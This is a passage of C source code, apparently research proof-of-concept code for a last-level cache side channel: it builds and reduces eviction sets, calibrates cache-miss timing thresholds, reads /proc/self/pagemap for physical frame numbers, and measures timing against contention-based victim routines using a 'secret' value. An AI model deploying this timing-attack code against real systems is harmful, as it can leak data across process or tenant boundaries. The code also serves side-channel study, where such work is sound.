  list_append(&eviction_set, (void *)0x7fffee140000);
  list_append(&eviction_set, (void *)0x7ffff0be0000);
  list_append(&eviction_set, (void *)0x7ffff3140000);
  list_append(&eviction_set, (void *)0x7ffff56c0000);
  list_append(&eviction_set, (void *)0x7fffde6e0000);
  *len_addr = 12;
  return eviction_set;
}

struct Node* find_eviction_set(void *buffer, void *victim_addr, int *len_addr) {
    struct Node *eviction_set = NULL;
    struct Node *current = NULL;
    const int initial_set_size = 3072;
    uint64_t offset;
    uint32_t cache_set;
    unsigned char *slice;
    int ret;
    int len;
    int i, j;
    int found = 0;
  
    // Pick the first cache line as victim address
    offset = victim_addr - buffer;
    int random = rand();
    offset += random*CACHE_BLOCK_SIZE;
    offset &= BUF_SIZE;

    // Fill victim line with any data (to be be the non-zero page)
    slice = (unsigned char *)victim_addr;
    for (j = 0; j < 64; j++) {
        slice[j] = i + j;
    }
    // Check the LLC cache set of the victim address
    cache_set = get_cache_set_index((uint64_t)victim_addr, 3);
    if(debug) printf("[+][0] Picked victim address %p (cache set = %d)\n", victim_addr, cache_set);

    cache_miss_treshold = calibrate_cache_miss_threshold (victim_addr);
    printf("[+][0] Calibrated Cache Miss Threshold = %d\n", cache_miss_treshold);

  
    while(found == 0) {
        offset = victim_addr - buffer;
        random = rand();
        offset += random*CACHE_BLOCK_SIZE;
        offset &= BUF_SIZE;
        // Construct a large pool of addresses from which to get the eviction set
        for (i = 0; i < initial_set_size; i++) {
            offset += CACHE_BLOCK_SIZE; // start scanning from the next cache line
            offset %= BUF_SIZE;
            // Find an address in the same LLC cache set as the victim address to construct the eviction set
            // NOTE: the cache set mapping will change for each cacheline which is 64 Bytes
            while (get_cache_set_index((uint64_t)buffer + offset, 3) != cache_set) {
                offset += CACHE_BLOCK_SIZE;
                offset %= BUF_SIZE;
            }

            // Add the address found to the list of addresses
            list_append(&eviction_set, buffer + offset);
        }

        // Fill victim line with any data (to be be the non-zero page)
        current = eviction_set;
        for (i = 0; i < initial_set_size; i++) {
            slice = (unsigned char *)current->address;
            for (j = 0; j < 64; j++) {
                slice[j] = i + j;
            }

            // printf("%04d %016lX\n", i, (uint64_t) current->address);
            current = current->next;
        }

        // Check that this initial large pool works
        ret = test_eviction_set(eviction_set, victim_addr);
        if (ret) {
            if(debug) printf("[+][0] Initial candidate set evicted victim\n");
        } 
        else {
            if(1) printf("[!][0] Error: invalid candidate set, try again\n");
            eviction_set = NULL;
            continue;
            //exit(0);
        }
    
        // Reduce the eviction set
        if(debug) printf("[+][0] Starting reduction...\n");
        ret = reduce_eviction_set_gt(&eviction_set, victim_addr);
        len = list_length(eviction_set);
        if (ret) {
            if(1) printf("[!][0] Error: optimal eviction set not found or not working (length=%d)\n", len);
            eviction_set = NULL;
            continue;
            //exit(0);
        } 
        else {
            if(1) printf("[+][0] Found minimal eviction set for %p (length=%d)\n", victim_addr, len);
        }
    
        // Verify that the reduced set works (this can be removed)
        // debug = true;
        int successes = 0;
        for (i = 0; i < 20; i++) {
            ret = test_eviction_set(eviction_set, victim_addr);
            if (ret) {
                successes += 1;
            }
        }
    
        // Is this good enough?
        if (successes > i-1) {
            printf("[+][0] Works %d / %d times\n", successes, i);
            found = 1;
        } 
        else {
            printf("[!][0] Works %d / %d times\n", successes, i);
            eviction_set = NULL;
            continue;
            //exit(1);
        }
  }
  
  *len_addr = len;
  return eviction_set;
}


#define ORIG_BUFFER "Hello, World!"
#define NEW_BUFFER "Hello, Linux!"
#define PAGE_SHIFT 12
#define PAGEMAP_LENGTH 8

void* create_buffer(void) {
   size_t buf_size = strlen(ORIG_BUFFER) + 1;

   // Allocate some memory to manipulate
   void *buffer = malloc(buf_size);
   if(buffer == NULL) {
      fprintf(stderr, "Failed to allocate memory for buffer\n");
      exit(1);
   }

   // Lock the page in memory
   // Do this before writing data to the buffer so that any copy-on-write
   // mechanisms will give us our own page locked in memory
   if(mlock(buffer, buf_size) == -1) {
      fprintf(stderr, "Failed to lock page in memory: %s\n", strerror(errno));
      exit(1);
   }

   // Add some data to the memory
   strncpy(buffer, ORIG_BUFFER, strlen(ORIG_BUFFER));

   return buffer;
}

unsigned long get_page_frame_number_of_address(void *addr) {
   // Open the pagemap file for the current process
   FILE *pagemap = fopen("/proc/self/pagemap", "rb");

   // Seek to the page that the buffer is on
   unsigned long offset = (unsigned long)addr / getpagesize() * PAGEMAP_LENGTH;
   if(fseek(pagemap, (unsigned long)offset, SEEK_SET) != 0) {
      fprintf(stderr, "Failed to seek pagemap to proper location\n");
      exit(1);
   }

   // The page frame number is in bits 0-54 so read the first 7 bytes and clear the 50th bit
   unsigned long page_frame_number = 0;
   fread(&page_frame_number, 1, PAGEMAP_LENGTH-1, pagemap);

   page_frame_number &= 0x7FFFFFFFFFFFFF;

   fclose(pagemap);

   return page_frame_number;
}
int open_memory(void) {
   // Open the memory (must be root for this)
   int fd = open("/dev/mem", O_RDWR);

   if(fd == -1) {
      fprintf(stderr, "Error opening /dev/mem: %s\n", strerror(errno));
      exit(1);
   }

   return fd;
}

void seek_memory(int fd, unsigned long offset) {
   unsigned pos = lseek(fd, offset, SEEK_SET);

   if(pos == -1) {
      fprintf(stderr, "Failed to seek /dev/mem: %s\n", strerror(errno));
      exit(1);
   }
}

void check_contiguity(void *buffer) {
  FILE *fp;
  fp=fopen("mapping.txt", "w");
   unsigned int page_frame_number = get_page_frame_number_of_address(buffer);
   if(page_frame_number != 0x3d2000 && page_frame_number != 0x3d2a00) {
     fprintf(fp, "[!] Error: mmaped buffer changed location to physical frame: 0x%x\n", page_frame_number);
     //exit(1);
   }
   unsigned int old_page_frame = page_frame_number;
   unsigned int pageoff = 0x1000;
   while(pageoff < BUF_SIZE) {
     page_frame_number = get_page_frame_number_of_address(buffer+pageoff);
     //printf("Page frame: 0x%x\n", page_frame_number);
     if(pageoff % 0x200000 == 0) {
       if(page_frame_number - old_page_frame != 1) {
         fprintf(fp, "[!] Error[1]: mmaped buffer not contiguous going from frame: 0x%x to frame: 0x%x diff: 0x%x offset: 0x%x\n", old_page_frame, page_frame_number, old_page_frame - page_frame_number, pageoff);
         //exit(1);
       }
     }
     if(pageoff % 0x200000 != 0) {
       if(page_frame_number - old_page_frame != 1) {
         fprintf(fp, "[!] Error[2]: mmaped buffer not contiguous going from frame: 0x%x to frame: 0x%x diff: 0x%x offset: 0x%x\n", old_page_frame, page_frame_number, old_page_frame - page_frame_number, pageoff);
         //exit(1);
       }
     }
     pageoff += 0x1000;
     old_page_frame = page_frame_number;
   }
   printf("[+] Allocated contiguous buffer starting at physical frame: 0x%x\n", (unsigned int)get_page_frame_number_of_address(buffer));
   fclose(fp);
   return;
}
void * segbuffer[200];


void *setup_everything(void * allocated_buffer) {
	void *buffer, *bufferprep;
	struct Node *eviction_set = NULL;
	struct Node *current = NULL;
	void *victim_addr;
	const int initial_set_size = 3072;
	uint64_t offset;
	uint32_t cache_set;
	unsigned char *slice;
	int ret;
	int len;
	int i, j;
	int seed;
 
	unsigned int lo, hi;
	__asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
	srand(lo);
 
 
  // Allocate buffer of BUF_SIZE
  //bufferprep = mmap(NULL, 4*1024UL*1024, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
	buffer = allocated_buffer;
/*	buffer = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);

 	if (buffer == MAP_FAILED) {
		perror("mmap");
		exit(1);
	}*/
	/*if(mlock(bufferprep, 4*1024UL*1024) == -1) {
    printf("[!] Error: failed to lock page in memory: %s\n", strerror(errno));
		exit(1);
	}*/
 /*  
	if(mlock(buffer, BUF_SIZE) == -1) {
    printf("[!] Error: failed to lock page in memory: %s\n", strerror(errno));
		exit(1);
	}

	check_contiguity(buffer);
*/ /*
	FILE *fp = fopen("pageids.txt", "r");
	size_t read;
	char *line = NULL;
	size_t flen = 0;

   
	for(int i = 0; i < 200; i++) {
		if ((read = getline(&line, &flen, fp)) != -1) {
			//printf("Retrieved line of length %zu:\n", read);
			//printf("%s", line);
		}
		else {
		  printf("[!] Cannot read line\n");
		  exit(1);
		}
		char *page;
		int id = atoi(line);
		//printf("%d\n", id);
		page = shmat(id, NULL, 0);
		if (page == MAP_FAILED) {
			perror("shmat");
			return 1;
		} 

		// @page now maps to the physical huge page(s) allocated by shm-create,
		// enjoy.

		unsigned int page_frame_number = get_page_frame_number_of_address(page);
		unsigned int old_page_frame = page_frame_number;
		unsigned int pageoff = 0x1000;
		//printf("shmem worked on id %d!, %p %x\n", id, page, page_frame_number);
		shmctl(id, IPC_RMID, NULL);
		segbuffer[i] = page;
	}

	for(int i = 0; i < 200; i++) {
		//printf("%p\n", segbuffer[i]); 
	}
	printf("%p\n", segbuffer[199]); 
	buffer = segbuffer[199];
*/
 //buffer = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
  //printf("%x\n", get_page_frame_number_of_address((void *)0x7fffed8a0000));
  /*list_append(&eviction_set, (void *)0x7fffedb80000);
  list_append(&eviction_set, (void *)0x7ffff1240000);
  list_append(&eviction_set, (void *)0x7ffff1500000);
  list_append(&eviction_set, (void *)0x7ffff18a0000);
  list_append(&eviction_set, (void *)0x7ffff5280000);
  list_append(&eviction_set, (void *)0x7ffff56c0000);
  list_append(&eviction_set, (void *)0x7fffdf880000);
  list_append(&eviction_set, (void *)0x7fffe2940000);
  list_append(&eviction_set, (void *)0x7fffe2d00000);
  list_append(&eviction_set, (void *)0x7fffe6b60000);
  list_append(&eviction_set, (void *)0x7fffea560000);*/
  
  /*
  char str[300];
  int sequence[100];
  char * token;
  printf("Enter test sequence:\n");
  scanf(" %[^\n]",str);
  while (1)
  {
      token = strtok(str, ",");
      int i = 0;
      while(token != NULL){
        int val = atoi(token);
        sequence[i] = val;
        i++;
        token = strtok(NULL, ",");
      }
      
      for(int j = 0; j < i; j++){
        printf("%d,",sequence[j]);
      }
      printf("\nEnter test sequence:\n");
      scanf(" %[^\n]",str);
  }*/
   
  int len0, len1, len2, len3;  
 /*  struct Node* eviction_set1 = find_eviction_set(buffer, buffer, &len1);
  //struct Node* eviction_set1 = static_eviction_set1(&len1);
  print_eviction_set(eviction_set1, len1);
 
  printf("RDTSC Overhead: back-to-back");
  test_empty_set0(eviction_set1, buffer, 0x00000);
  test_empty_set0(eviction_set1, buffer, 0x00000);
  test_empty_set0(eviction_set1, buffer, 0x00000);
  test_empty_set0(eviction_set1, buffer, 0x00000);
  test_empty_set0(eviction_set1, buffer, 0x00000); 
  test_empty_set0(eviction_set1, buffer, 0x00000);
  test_empty_set0(eviction_set1, buffer, 0x00000);
  test_empty_set0(eviction_set1, buffer, 0x00000);
  test_empty_set0(eviction_set1, buffer, 0x00000); 
  test_empty_set0(eviction_set1, buffer, 0x00000);  
  printf("\n");
  printf("Accessing immediately after previous access");
  test_empty_set(eviction_set1, buffer, 0x00000);
  test_empty_set(eviction_set1, buffer, 0x00000);
  test_empty_set(eviction_set1, buffer, 0x00000);
  test_empty_set(eviction_set1, buffer, 0x00000);
  test_empty_set(eviction_set1, buffer, 0x00000); 
  test_empty_set(eviction_set1, buffer, 0x00000);
  test_empty_set(eviction_set1, buffer, 0x00000);
  test_empty_set(eviction_set1, buffer, 0x00000);
  test_empty_set(eviction_set1, buffer, 0x00000); 
  test_empty_set(eviction_set1, buffer, 0x00000); 
  printf("\n");
  printf("L1 flush_set");
  test_flush_set(eviction_set1, buffer, 0xC000);
  test_flush_set(eviction_set1, buffer, 0xC000);
  test_flush_set(eviction_set1, buffer, 0xC000);
  test_flush_set(eviction_set1, buffer, 0xC000);
  test_flush_set(eviction_set1, buffer, 0xC000); 
  test_flush_set(eviction_set1, buffer, 0xC000);
  test_flush_set(eviction_set1, buffer, 0xC000);
  test_flush_set(eviction_set1, buffer, 0xC000);
  test_flush_set(eviction_set1, buffer, 0xC000); 
  test_flush_set(eviction_set1, buffer, 0xC000); 
  printf("\n");
    printf("L1+L2 flush_set");
  test_flush_set(eviction_set1, buffer, 0x8000);
  test_flush_set(eviction_set1, buffer, 0x8000);
  test_flush_set(eviction_set1, buffer, 0x8000);
  test_flush_set(eviction_set1, buffer, 0x8000);
  test_flush_set(eviction_set1, buffer, 0x8000); 
  test_flush_set(eviction_set1, buffer, 0x8000);
  test_flush_set(eviction_set1, buffer, 0x8000);
  test_flush_set(eviction_set1, buffer, 0x8000);
  test_flush_set(eviction_set1, buffer, 0x8000); 
  test_flush_set(eviction_set1, buffer, 0x8000); 
  printf("\n");
      printf("eviction_set");
  test_flush_set(eviction_set1, buffer, 0x00000);
  test_flush_set(eviction_set1, buffer, 0x00000);
  test_flush_set(eviction_set1, buffer, 0x00000);
  test_flush_set(eviction_set1, buffer, 0x00000);
  test_flush_set(eviction_set1, buffer, 0x00000); 
  test_flush_set(eviction_set1, buffer, 0x00000);
  test_flush_set(eviction_set1, buffer, 0x00000);
  test_flush_set(eviction_set1, buffer, 0x00000);
  test_flush_set(eviction_set1, buffer, 0x00000); 
  test_flush_set(eviction_set1, buffer, 0x00000); 
   
  return;*/
   

  
  
	struct Node* eviction_set1 = find_eviction_set(buffer, buffer+CACHE_BLOCK_SIZE*my_set, &len1);
	//struct Node* eviction_set1 = static_eviction_set1(&len1);

	int successes1s = 0;
	for (i = 0; i < 20; i++) {
	ret = test_eviction_set(eviction_set1, buffer+CACHE_BLOCK_SIZE*my_set);
		if (ret) {
			successes1s += 1;
		}
	}
//	printf("[+] Initial Works %d / %d times\n", successes1s, i);

	while(successes1s < 20) {
	eviction_set1 = find_eviction_set(buffer, buffer+CACHE_BLOCK_SIZE*my_set, &len1);
	successes1s = 0;
		for (i = 0; i < 20; i++) {
			ret = test_eviction_set(eviction_set1, buffer+CACHE_BLOCK_SIZE*my_set);
			if (ret) {
				successes1s += 1;
			}
		}
	}
//	printf("[+] My Works %d / %d times\n", successes1s, i);
	if(debug) print_eviction_set(eviction_set1, len1);

//test_step0(eviction_set1, buffer+CACHE_BLOCK_SIZE*my_set, buffer+CACHE_BLOCK_SIZE*my_set);    
//test_step0(eviction_set1, buffer+CACHE_BLOCK_SIZE*my_set, buffer+CACHE_BLOCK_SIZE*my_set);   

	struct Node* eviction_set2 = find_eviction_set(buffer, eviction_set1->address, &len2);
	//struct Node* eviction_set2 = static_eviction_set2(&len2);

	int successes2s = 0;
	for (i = 0; i < 20; i++) {
		ret = test_eviction_set(eviction_set2, eviction_set1->address);
		if (ret) {
			successes2s += 1;
		}
	}
//	printf("[+] Initial Works %d / %d times\n", successes2s, i);

	while(successes2s < 20) {
	eviction_set2 = find_eviction_set(buffer, eviction_set1->address, &len2);
	successes2s = 0;
		for (i = 0; i < 20; i++) {
			ret = test_eviction_set(eviction_set2, eviction_set1->address);
			if (ret) {
				successes2s += 1;
			}
		}
	}
//	printf("[+] My Works %d / %d times\n", successes2s, i);
	if(debug) print_eviction_set(eviction_set2, len2);     


	struct Node* eviction_set3 = find_eviction_set(buffer, eviction_set2->address, &len3);
	//struct Node* eviction_set3 = static_eviction_set3(&len3);

	int successes3s = 0;
	for (i = 0; i < 20; i++) {
		ret = test_eviction_set(eviction_set3, eviction_set2->address);
		if (ret) {
			successes3s += 1;
		}
	}
//	printf("[+] Initial Works %d / %d times\n", successes3s, i);

	while(successes3s < 20) {
	eviction_set3 = find_eviction_set(buffer, eviction_set2->address, &len3);
	successes3s = 0;
		for (i = 0; i < 20; i++) {
			ret = test_eviction_set(eviction_set3, eviction_set2->address);
			if (ret) {
				successes3s += 1;
			}
		}
	}
//	printf("[+] My Works %d / %d times\n", successes3s, i);
	if(debug) print_eviction_set(eviction_set3, len3);
  
  
	void *addrA = buffer+CACHE_BLOCK_SIZE*my_set;
	void *addrB = eviction_set1->address;

	struct Node* eviction_final = NULL;
	int final_len = 0;

	struct Node* tempNode = NULL;
	struct Node* travNode1 = eviction_set1->next;
	struct Node* travNode2 = eviction_set2->next;
	struct Node* travNode3 = eviction_set3;
	struct Node* checkNode = NULL;
	int t1 = 1, t2 = 1, t3 = 0, check = 0, duplicate = 0;

	while(final_len != 22) {
		// choose candidate
		if(t1 != len1) {
		  tempNode = travNode1;
		  travNode1 = travNode1->next;
		  t1++;
		}
		else if(t2 != len2) {
		  tempNode = travNode2;
		  travNode2 = travNode2->next;
		  t2++;
		}
		else if(t3 != len3) {
		  tempNode = travNode3;
		  travNode3 = travNode3->next;
		  t3++;
		}
		else {
		  break;
		}
		duplicate = 0;
		check = 0;
		if(tempNode->address == addrA || tempNode->address == addrB) {
		  duplicate = 1;
		}
		checkNode = eviction_final;
		while(check < final_len) {
		  if(tempNode->address == checkNode->address) {
			duplicate = 1;
		  }
		  checkNode = checkNode->next;
		  check++;
		}
		if(!duplicate) {
		  list_append(&eviction_final, tempNode->address);
		  final_len++;
		}
	}

	if(final_len != 22) {
		printf("[!] Too many duplicates evset_final len = %d\n", final_len); 
		//exit(1);
		return 0;
	}

//	printf("[+] AddrA = %p\n", addrA);
//	printf("[+] AddrB = %p\n", addrB);
//	print_eviction_set(eviction_final, final_len);


	int successes1 = 0;
	for (i = 0; i < 20; i++) {
		ret = test_eviction_set(eviction_final, addrA);
		if (ret) {
			successes1 += 1;
		}
	}
//	printf("[+] evset_final + addrA Works %d / %d times\n", successes1, i);

	int successes2 = 0;
	for (i = 0; i < 20; i++) {
		ret = test_eviction_set(eviction_final, addrB);
		if (ret) {
			successes2 += 1;
		}
	}
//	printf("[+] evset_final + addrB Works %d / %d times\n", successes2, i);

	int successes3 = 0;
	for (i = 0; i < 20; i++) {
		ret = test_eviction_set(eviction_set1, addrA);
		if (ret) {
			successes3 += 1;
		}
	}
//	printf("[+] evset1 + addrA Works %d / %d times\n", successes3, i);

	int successes4 = 0;
	for (i = 0; i < 20; i++) {
		ret = test_eviction_set(eviction_set2, addrB);
		if (ret) {
			successes4 += 1;
		}
	}
//	printf("[+] evset2 + addrB Works %d / %d times\n", successes4, i);



	int timeA_AB, timeB_AB;
	int timeA_BA, timeB_BA;

	int AnB_AB = 0;
	int AB_AB = 0;
	int AnBn_AB = 0;
	int ABn_AB = 0;
	int AnB_BA = 0;
	int AB_BA = 0;
	int AnBn_BA = 0;
	int ABn_BA = 0;


	int static_BA = 0;

	if(successes1 > 19 && successes2 > 19 && successes3 > 15 && successes4 > 15) {

//		printf("[+] GOOD SET\n\n");
		// Saving Eviction Set addresses to global memory
		struct Node* ptr = eviction_final;
		for(int h = 0; h < 22; h++) {
			attackerAddr[h] = ptr->address;
			ptr = ptr->next;
		}
		attackerAddr[22] = addrA;
		attackerAddr[23] = addrB;
		*(uint64_t *)addrA = 0;
		*(uint64_t *)addrB = 0;
		bp = &attackerAddr[23];
		bpp = &bp;
		bppp = &bpp;
		bpppp = &bppp;
		bppppp = &bpppp;
		bpppppp = &bppppp;
		bppppppp = &bpppppp;

        
		AnB_AB = 0;
		AB_AB = 0;
		AnBn_AB = 0;
		ABn_AB = 0;
		AnB_BA = 0;
		AB_BA = 0;
		AnBn_BA = 0;
		ABn_BA = 0;

	 	for(int m = 0; m < 10000; m++) {

			int errorAB = test_eviction_setVictim(eviction_final, addrA, addrB, &timeA_AB, &timeB_AB, dummy_AB);  
			int errorBA = test_eviction_setVictim(eviction_final, addrA, addrB, &timeA_BA, &timeB_BA, dummy_BA);

			if(errorAB == 0) {
				if(timeA_AB > cache_miss_treshold && timeB_AB > cache_miss_treshold) AnBn_AB++;
				if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) AnB_AB++;
				if(timeA_AB < cache_miss_treshold && timeB_AB > cache_miss_treshold) ABn_AB++;
				if(timeA_AB < cache_miss_treshold && timeB_AB < cache_miss_treshold) AB_AB++;
			}

			if(debug && m < 20) {
				if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) {
					printf("[+] Single Thread Dummy Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
				}
				else {
					printf("[!] Single Thread Dummy Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
				}
			}

			if(errorBA == 0) {
				if(timeA_BA > cache_miss_treshold && timeB_BA > cache_miss_treshold) AnBn_BA++;
				if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) AnB_BA++;
				if(timeA_BA < cache_miss_treshold && timeB_BA > cache_miss_treshold) ABn_BA++;
				if(timeA_BA < cache_miss_treshold && timeB_BA < cache_miss_treshold) AB_BA++;
			}

			if(debug && m < 20) {
				if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) {
					printf("[+] Single Thread Dummy Victim (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
				}
				else {
					printf("[!] Single Thread Dummy Victim (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
				}
			}
		}

//		printf("\n\n");
//		fflush(stdout);

		printf("\n[+][1] Single Thread Dummy Victim (A-B):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n", AnB_AB, ABn_AB, AnBn_AB, AB_AB, AnB_AB, ABn_AB);
		printf("[+][1] Single Thread Dummy Victim (B-A):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n", AnB_BA, ABn_BA, AnBn_BA, AB_BA, ABn_BA, AnB_BA);
//		fflush(stdout);



		for(int x = 0; x < 1; x++) {
			AnB_AB = 0;
			AB_AB = 0;
			AnBn_AB = 0;
			ABn_AB = 0;
			AnB_BA = 0;
			AB_BA = 0;
			AnBn_BA = 0;
			ABn_BA = 0;
			for(int m = 0; m < 10000; m++) {

			  	int errorAB = test_eviction_setAB(eviction_final, addrA, addrB, &timeA_AB, &timeB_AB);  
			  	int errorBA = test_eviction_setBA(eviction_final, addrA, addrB, &timeA_BA, &timeB_BA);

				if(errorAB == 0) {
					if(timeA_AB > cache_miss_treshold && timeB_AB > cache_miss_treshold) AnBn_AB++;
					if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) AnB_AB++;
					if(timeA_AB < cache_miss_treshold && timeB_AB > cache_miss_treshold) ABn_AB++;
					if(timeA_AB < cache_miss_treshold && timeB_AB < cache_miss_treshold) AB_AB++;
				}

				if(debug && m < 20) {
					if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) {
						printf("[+] A-B Sequence (expected only B in cache): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
					}
					else {
						printf("[!] A-B Sequence (expected only B in cache): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
					}
				}

				if(errorBA == 0) {
					if(timeA_BA > cache_miss_treshold && timeB_BA > cache_miss_treshold) AnBn_BA++;
					if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) AnB_BA++;
					if(timeA_BA < cache_miss_treshold && timeB_BA > cache_miss_treshold) ABn_BA++;
					if(timeA_BA < cache_miss_treshold && timeB_BA < cache_miss_treshold) AB_BA++;
				}

				if(debug && m < 20) {
					if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) {
						printf("[+] A-B Sequence (expected only B in cache): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
					}
					else {
						printf("[!] A-B Sequence (expected only B in cache): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
					}
				}

			}
			sAB_ex[x] = (float)AnB_AB/1000;
			sAB_du[x] = (float)ABn_AB/1000;
			sBA_ex[x] = (float)ABn_BA/1000;
			sBA_du[x] = (float)AnB_BA/1000;
		}



		printf("\n[+][2] Single Thread Static A-B sequence:  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n", AnB_AB, ABn_AB, AnBn_AB, AB_AB, AnB_AB, ABn_AB);
		printf("[+][2] Single Thread Static B-A sequence:  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n\n", AnB_BA, ABn_BA, AnBn_BA, AB_BA, ABn_BA, AnB_BA);


		static_BA = ABn_BA;
    //printf("%d,", static_BA);
		//fflush(stdout);
		if(static_BA < 5000) return static_BA;

		AnB_AB = 0;
		AB_AB = 0;
		AnBn_AB = 0;
		ABn_AB = 0;
		AnB_BA = 0;
		AB_BA = 0;
		AnBn_BA = 0;
		ABn_BA = 0;

		for(int x = 0; x < 1; x++) {
			AnB_AB = 0;
			AB_AB = 0;
			AnBn_AB = 0;
			ABn_AB = 0;
			AnB_BA = 0;
			AB_BA = 0;
			AnBn_BA = 0;
			ABn_BA = 0;
		 	for(int m = 0; m < 10000; m++) {

				int errorAB = test_eviction_setVictim(eviction_final, addrA, addrB, &timeA_AB, &timeB_AB, no_contention_victim);  
				int errorBA = test_eviction_setVictim(eviction_final, addrA, addrB, &timeA_BA, &timeB_BA, contention_victim);

				if(errorAB == 0) {
					if(timeA_AB > cache_miss_treshold && timeB_AB > cache_miss_treshold) AnBn_AB++;
					if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) AnB_AB++;
					if(timeA_AB < cache_miss_treshold && timeB_AB > cache_miss_treshold) ABn_AB++;
					if(timeA_AB < cache_miss_treshold && timeB_AB < cache_miss_treshold) AB_AB++;
				}

				if(debug && m < 20) {
					if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) {
						printf("[+] Single Thread No Contention Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
					}
					else {
						printf("[!] Single Thread No Contention Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
					}
				}

				if(errorBA == 0) {
					if(timeA_BA > cache_miss_treshold && timeB_BA > cache_miss_treshold) AnBn_BA++;
					if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) AnB_BA++;
					if(timeA_BA < cache_miss_treshold && timeB_BA > cache_miss_treshold) ABn_BA++;
					if(timeA_BA < cache_miss_treshold && timeB_BA < cache_miss_treshold) AB_BA++;
				}

				if(debug && m < 20) {
					if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) {
						printf("[+] Single Thread Contention Victim    (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
					}
					else {
						printf("[!] Single Thread Contention Victim    (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
					}
				}
			}
			cAB_ex[x] = (float)AnB_AB/1000;
			cAB_du[x] = (float)ABn_AB/1000;
			cBA_ex[x] = (float)ABn_BA/1000;
			cBA_du[x] = (float)AnB_BA/1000;
		}

//		printf("\n\n");
//		fflush(stdout);

		//printf("[+][3] Single Thread No Contention Victim (A-B):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n", AnB_AB, ABn_AB, AnBn_AB, AB_AB, AnB_AB, ABn_AB);
		//printf("[+][3] Single Thread Contention Victim    (B-A):  A'B[%0.4d] AB'[%0.4d] A'B'[%0.4d] AB[%0.4d]   expected[%0.4d/10000] vs dual[%0.4d/10000]\n\n", AnB_BA, ABn_BA, AnBn_BA, AB_BA, ABn_BA, AnB_BA);
//		fflush(stdout);


		AnB_AB = 0;
		AB_AB = 0;
		AnBn_AB = 0;
		ABn_AB = 0;
		AnB_BA = 0;
		AB_BA = 0;
		AnBn_BA = 0;
		ABn_BA = 0;

	 	for(int m = 0; m < 10000; m++) {

			mask = 0x01;
			brcond = 10;
			brcondptr = &brcond;
			secret = 0;
			int errorAB = test_eviction_setVictim(eviction_final, addrA, addrB, &timeA_AB, &timeB_AB, contentionX_victim);  
			secret = 0xFF;
			int errorBA = test_eviction_setVictim(eviction_final, addrA, addrB, &timeA_BA, &timeB_BA, contentionX_victim);

			if(errorAB == 0) {
				if(timeA_AB > cache_miss_treshold && timeB_AB > cache_miss_treshold) AnBn_AB++;
				if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) AnB_AB++;
				if(timeA_AB < cache_miss_treshold && timeB_AB > cache_miss_treshold) ABn_AB++;
				if(timeA_AB < cache_miss_treshold && timeB_AB < cache_miss_treshold) AB_AB++;
			}

			if(debug && m < 20) {
				if(timeA_AB > cache_miss_treshold && timeB_AB < cache_miss_treshold) {
					printf("[+] Single Thread Contention(0) Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
				}
				else {
					printf("[!] Single Thread Contention(0) Victim (A-B): addrA = %d, addrB = %d\n", timeA_AB, timeB_AB); 
				}
			}

			if(errorBA == 0) {
				if(timeA_BA > cache_miss_treshold && timeB_BA > cache_miss_treshold) AnBn_BA++;
				if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) AnB_BA++;
				if(timeA_BA < cache_miss_treshold && timeB_BA > cache_miss_treshold) ABn_BA++;
				if(timeA_BA < cache_miss_treshold && timeB_BA < cache_miss_treshold) AB_BA++;
			}

			if(debug && m < 20) {
				if(timeA_BA > cache_miss_treshold && timeB_BA < cache_miss_treshold) {
					printf("[+] Single Thread Contention(1) Victim (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
				}
				else {
					printf("[!] Single Thread Contention(1) Victim (B-A): addrA = %d, addrB = %d\n", timeA_BA, timeB_BA); 
				}
			}
		}

//		printf("\n\n");
//		fflush(stdout);

